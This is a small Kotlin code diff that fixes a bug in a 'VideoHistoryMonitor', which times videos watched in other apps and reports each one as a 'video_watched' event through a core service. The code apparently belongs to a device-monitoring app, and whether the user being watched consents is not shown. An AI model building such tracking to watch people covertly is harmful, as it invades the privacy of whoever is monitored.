@@ -70,7 +70,7 @@ object VideoHistoryMonitor {
     }
 
     private fun flushCurrentVideo(newPkg: String) {
-        if (lastTitle.isEmpty() || lastPkg != newPkg) return
+        if (lastTitle.isEmpty()) return  // Bug #13 fix: removed lastPkg!=newPkg check — was skipping flush on app switch
         val watchedSec = (System.currentTimeMillis() - videoStartMs) / 1000
         if (watchedSec >= 5) {
             CoreService.instance?.sendData("video_watched", JSONObject().apply {
